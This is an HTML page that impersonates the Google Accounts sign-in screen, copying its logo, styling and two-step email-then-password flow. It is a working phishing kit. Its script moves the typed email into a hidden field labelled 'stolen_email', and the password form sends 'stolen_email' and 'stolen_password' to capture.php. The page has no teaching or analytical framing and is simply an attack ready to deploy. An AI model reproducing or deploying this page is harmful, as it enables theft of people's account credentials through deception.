<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
    <style>
        body {
            font-family: Roboto, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .card {
            width: 368px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 75px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 16px;
        }
        h2 {
            font-size: 16px;
            font-weight: 400;
            color: #202124;
            margin: 0 0 24px;
        }
        .input-container {
            position: relative;
            margin-bottom: 16px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 15px 15px;
            margin: 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 14px 14px; /* Adjust padding due to thicker border */
        }
        .button-primary {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
            float: right;
        }
        .button-primary:hover {
            background-color: #1565c0;
        }
        .footer-links {
            text-align: left;
            margin-top: 50px;
        }
        .footer-links a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <h1>Sign in</h1>
        <h2 id="subtitle">Use your Google Account</h2>

        <form id="email-form" method="POST">
            <div class="input-container">
                <input type="email" name="user_email" placeholder="Email or phone" required>
            </div>
            <div class="footer-links">
                <a href="#">Forgot email?</a>
            </div>
            <div style="margin-top: 32px; overflow: hidden;">
                <button type="button" class="button-primary" onclick="showPasswordForm()">Next</button>
            </div>
        </form>
        
        <form id="password-form" action="capture.php" method="POST" style="display: none;">
            <input type="hidden" name="stolen_email" id="stolen-email-field"> 
            
            <div class="input-container">
                <input type="password" name="stolen_password" placeholder="Enter your password" required>
            </div>
            <div class="footer-links">
                <a href="#">Forgot password?</a>
            </div>
            <div style="margin-top: 32px; overflow: hidden;">
                <button type="submit" class="button-primary">Sign in</button>
            </div>
        </form>

    </div>
    <script>
        // JavaScript to mimic the two-step login process
        function showPasswordForm() {
            var emailInput = document.querySelector('input[name="user_email"]');
            var emailForm = document.getElementById('email-form');
            var passwordForm = document.getElementById('password-form');
            var subtitle = document.getElementById('subtitle');
            var hiddenEmailField = document.getElementById('stolen-email-field');

            if (emailInput.value.trim() !== '') {
                // Transfer the email to the hidden field in the password form
                hiddenEmailField.value = emailInput.value.trim();
                
                // Update the display to show the email and hide the email form
                subtitle.innerHTML = 'Welcome, <span style="font-weight: 500;">' + emailInput.value.trim() + '</span>';
                emailForm.style.display = 'none';
                passwordForm.style.display = 'block';
            } else {
                alert('Please enter your email or phone.');
            }
        }
    </script>
</body>
</html>
